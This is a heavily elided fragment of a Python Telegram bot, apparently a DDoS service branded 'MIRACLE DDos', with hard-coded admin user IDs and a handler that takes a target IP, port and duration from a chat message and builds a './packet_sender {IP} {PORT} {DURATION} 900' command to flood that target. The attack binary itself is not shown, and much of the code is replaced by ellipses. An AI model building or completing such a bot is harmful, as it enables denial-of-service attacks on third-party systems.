...
# Admin user IDs
admin_id = {"1419969308", "5792543632"}
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 *𝑴𝑰𝑹𝑨𝑪𝑳𝑬 𝑫𝑫𝒐𝒔™* 𝗯𝗼𝘁 !", reply_markup=markup, parse_mode='Markdown')
    bot.send_message(
        message.chat.id,
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if time > 5000:
                ...
                full_command = f"./packet_sender {IP} {PORT} {DURATION} 900"
